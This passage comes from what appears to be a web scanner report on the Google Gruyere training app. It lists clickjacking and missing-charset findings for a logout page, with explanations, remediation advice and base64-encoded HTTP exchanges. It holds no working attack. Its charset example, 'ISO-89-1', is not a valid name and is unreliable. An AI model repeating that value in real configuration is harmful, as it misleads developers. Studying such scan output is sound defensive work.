4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjxzY3JpcHQgc3JjPSIvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xpYi5qcyIgdGV4dD0idGV4dC9qYXZhc2NyaXB0Ij4KPC9zY3JpcHQ+CjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIAogICAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xvZ2luJz5TaWduIGluPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3YWNjb3VudC5ndGwnPlNpZ24gdXA8L2E+CiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+Cgo8ZGl2Pgo8aDIgY2xhc3M9J2hhcy1yZWZyZXNoJz5HcnV5ZXJlOiBIb21lPC9oMj4KPGRpdiBjbGFzcz0ncmVmcmVzaCc+PGEgY2xhc3M9J2J1dHRvbicgb25jbGljaz0nX3JlZnJlc2hIb21lKCI0MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYiKScgaHJlZj0nIyc+UmVmcmVzaDwvYT48L2Rpdj4KPC9kaXY+CjxkaXYgY2xhc3M9J2NvbnRlbnQnPgo8dGFibGUgd2lkdGg9JzEwMCUnPgoKICA8dHI+PHRkIGNvbHNwYW49JzMnPjxiPk1vc3QgcmVjZW50IHNuaXBwZXRzOjwvYj48L3RkPjwvdHI+CgoKCgoKCgoKCgoKCgoKCgoKCiAgPHRyPgogICAgPHRkPgogICAgIAogICAgPC90ZD4KICAgIDx0ZD4KICAgICAgPGI+PHNwYW4gc3R5bGU9J2NvbG9yOnJlZDsgdGV4dC1kZWNvcmF0aW9uOnVuZGVybGluZSc+QnJpZTwvc3Bhbj48L2I+CiAgICA8L3RkPgogICAgPHRkIHdpZHRoPScxMDAlJz48c3BhbiBpZD0nYnJpZSc+QnJpZSBpcyB0aGUgcXVlZW4gb2YgdGhlIGNoZWVzZXM8c3BhbiBzdHlsZT1jb2xvcjpyZWQ+ISEhPC9zcGFuPjwvc3Bhbj4KICAgIDxicj4KICAgICAgICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsP3VpZD1icmllJz5BbGwgc25pcHBldHM8L2E+Jm5ic3A7CiAgICAgIDxhIGhyZWY9J2h0dHBzOi8vbmV3cy5nb29nbGUuY29tL25ld3Mvc2VhcmNoP3E9YnJpZSc+SG9tZXBhZ2U8L2E+CiAgICA8YnI+CiAgICA8YnI+CiAgICA8L3RkPgogIDwvdHI+CgoKCiAgPHRyPgogICAgPHRkPgogICAgIAogICAgPC90ZD4KICAgIDx0ZD4KICAgICAgPGI+PHNwYW4gc3R5bGU9J2NvbG9yOmJsdWUnPkNoZWRkYXIgTWFjPC9zcGFuPjwvYj4KICAgIDwvdGQ+CiAgICA8dGQgd2lkdGg9JzEwMCUnPjxzcGFuIGlkPSdjaGVkZGFyJz5HcnV5ZXJlIGlzIHRoZSBjaGVlc2llc3QgYXBwbGljYXRpb24gb24gdGhlIHdlYi48L3NwYW4+CiAgICA8YnI+CiAgICAgICAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bD91aWQ9Y2hlZGRhcic+QWxsIHNuaXBwZXRzPC9hPiZuYnNwOwogICAgICA8YSBocmVmPSdodHRwczovL2ltYWdlcy5nb29nbGUuY29tLz9xPWNoZWRkYXIrY2hlZXNlJz5Ib21lcGFnZTwvYT4KICAgIDxicj4KICAgIDxicj4KICAgIDwvdGQ+CiAgPC90cj4KCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCjwvdGFibGU+CjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>66560350877802752</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/logout]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/logout]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0IEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClNldC1Db29raWU6IEdSVVlFUkU9OyBwYXRoPS80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogN2Y5MmJkY2E3YWE0NDMjZmODYxMGU3MmZhMmI4NmYNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MjoyOSBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU3OA0KRXhwaXJlczogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MjoyOSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhRE9DVFlQRSBIVE1MIFBVQkxJQyAiLS8vVzNDLy9EVEQgSFRNTCA0LjAxIFRyYW5zaXRpb25hbC8vRU4iPgo8IS0tIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuIC0tPgo8aHRtbD4KPGhlYWQ+Cjx0aXRsZT5HcnV5ZXJlOiBIb21lPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjxzY3JpcHQgc3JjPSIvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xpYi5qcyIgdGV4dD0idGV4dC9qYXZhc2NyaXB0Ij4KPC9zY3JpcHQ+CjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIAogICAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xvZ2luJz5TaWduIGluPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3YWNjb3VudC5ndGwnPlNpZ24gdXA8L2E+CiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+Cgo8ZGl2Pgo8aDIgY2xhc3M9J2hhcy1yZWZyZXNoJz5HcnV5ZXJlOiBIb21lPC9oMj4KPGRpdiBjbGFzcz0ncmVmcmVzaCc+PGEgY2xhc3M9J2J1dHRvbicgb25jbGljaz0nX3JlZnJlc2hIb21lKCI0MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYiKScgaHJlZj0nIyc+UmVmcmVzaDwvYT48L2Rpdj4KPC9kaXY+CjxkaXYgY2xhc3M9J2NvbnRlbnQnPgo8dGFibGUgd2lkdGg9JzEwMCUnPgoKICA8dHI+PHRkIGNvbHNwYW49JzMnPjxiPk1vc3QgcmVjZW50IHNuaXBwZXRzOjwvYj48L3RkPjwvdHI+CgoKCgoKCgoKCgoKCgoKCgoKCiAgPHRyPgogICAgPHRkPgogICAgIAogICAgPC90ZD4KICAgIDx0ZD4KICAgICAgPGI+PHNwYW4gc3R5bGU9J2NvbG9yOnJlZDsgdGV4dC1kZWNvcmF0aW9uOnVuZGVybGluZSc+QnJpZTwvc3Bhbj48L2I+CiAgICA8L3RkPgogICAgPHRkIHdpZHRoPScxMDAlJz48c3BhbiBpZD0nYnJpZSc+QnJpZSBpcyB0aGUgcXVlZW4gb2YgdGhlIGNoZWVzZXM8c3BhbiBzdHlsZT1jb2xvcjpyZWQ+ISEhPC9zcGFuPjwvc3Bhbj4KICAgIDxicj4KICAgICAgICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsP3VpZD1icmllJz5BbGwgc25pcHBldHM8L2E+Jm5ic3A7CiAgICAgIDxhIGhyZWY9J2h0dHBzOi8vbmV3cy5nb29nbGUuY29tL25ld3Mvc2VhcmNoP3E9YnJpZSc+SG9tZXBhZ2U8L2E+CiAgICA8YnI+CiAgICA8YnI+CiAgICA8L3RkPgogIDwvdHI+CgoKCiAgPHRyPgogICAgPHRkPgogICAgIAogICAgPC90ZD4KICAgIDx0ZD4KICAgICAgPGI+PHNwYW4gc3R5bGU9J2NvbG9yOmJsdWUnPkNoZWRkYXIgTWFjPC9zcGFuPjwvYj4KICAgIDwvdGQ+CiAgICA8dGQgd2lkdGg9JzEwMCUnPjxzcGFuIGlkPSdjaGVkZGFyJz5HcnV5ZXJlIGlzIHRoZSBjaGVlc2llc3QgYXBwbGljYXRpb24gb24gdGhlIHdlYi48L3NwYW4+CiAgICA8YnI+CiAgICAgICAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bD91aWQ9Y2hlZGRhcic+QWxsIHNuaXBwZXRzPC9hPiZuYnNwOwogICAgICA8YSBocmVmPSdodHRwczovL2ltYWdlcy5nb29nbGUuY29tLz9xPWNoZWRkYXIrY2hlZXNlJz5Ib21lcGFnZTwvYT4KICAgIDxicj4KICAgIDxicj4KICAgIDwvdGQ+CiAgPC90cj4KCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCjwvdGFibGU+CjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>49101316135900160</serialNumber>
    <type>8389120</type>
    <name><![CDATA[HTML does not specify charset]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/logout]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/logout]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>If a  response states that it contains HTML content but does not specify a character set, then the browser may analyze the HTML and attempt to determine which character set it appears to be using. Even if the majority of the HTML actually employs a standard character set such as UTF-8, the presence of non-standard characters anywhere in the response may cause the browser to interpret the content using a different character set. This can have unexpected results, and can lead to cross-site scripting vulnerabilities in which non-standard encodings like UTF-7 can be used to bypass the application's defensive filters.</p>
<p>In most cases, the absence of a charset directive does not constitute a security flaw, particularly if the response contains static content. You should review the contents of affected responses, and the context in which they appear, to determine whether any vulnerability exists. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>For every response containing HTML content, the application should include within the Content-type header a directive specifying a standard recognized character set, for example <b>charset=ISO-89-1</b>.
</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/436.html">CWE-436: Interpretation Conflict</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0IEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClNldC1Db29raWU6IEdSVVlFUkU9OyBwYXRoPS80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogN2Y5MmJkY2E3YWE0NDMjZmODYxMGU3MmZhMmI4NmYNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MjoyOSBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU3OA0KRXhwaXJlczogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MjoyOSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhRE9DVFlQRSBIVE1MIFBVQkxJQyAiLS8vVzNDLy9EVEQgSFRNTCA0LjAxIFRyYW5zaXRpb25hbC8vRU4iPgo8IS0tIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuIC0tPgo8aHRtbD4KPGhlYWQ+Cjx0aXRsZT5HcnV5ZXJlOiBIb21lPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjxzY3JpcHQgc3JjPSIvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xpYi5qcyIgdGV4dD0idGV4dC9qYXZhc2NyaXB0Ij4KPC9zY3JpcHQ+CjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIAogICAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xvZ2luJz5TaWduIGluPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3YWNjb3VudC5ndGwnPlNpZ24gdXA8L2E+CiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+Cgo8ZGl2Pgo8aDIgY2xhc3M9J2hhcy1yZWZyZXNoJz5HcnV5ZXJlOiBIb21lPC9oMj4KPGRpdiBjbGFzcz0ncmVmcmVzaCc+PGEgY2xhc3M9J2J1dHRvbicgb25jbGljaz0nX3JlZnJlc2hIb21lKCI0MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYiKScgaHJlZj0nIyc+UmVmcmVzaDwvYT48L2Rpdj4KPC9kaXY+CjxkaXYgY2xhc3M9J2NvbnRlbnQnPgo8dGFibGUgd2lkdGg9JzEwMCUnPgoKICA8dHI+PHRkIGNvbHNwYW49JzMnPjxiPk1vc3QgcmVjZW50IHNuaXBwZXRzOjwvYj48L3RkPjwvdHI+CgoKCgoKCgoKCgoKCgoKCgoKCiAgPHRyPgogICAgPHRkPgogICAgIAogICAgPC90ZD4KICAgIDx0ZD4KICAgICAgPGI+PHNwYW4gc3R5bGU9J2NvbG9yOnJlZDsgdGV4dC1kZWNvcmF0aW9uOnVuZGVybGluZSc+QnJpZTwvc3Bhbj48L2I+CiAgICA8L3RkPgogICAgPHRkIHdpZHRoPScxMDAlJz48c3BhbiBpZD0nYnJpZSc+QnJpZSBpcyB0aGUgcXV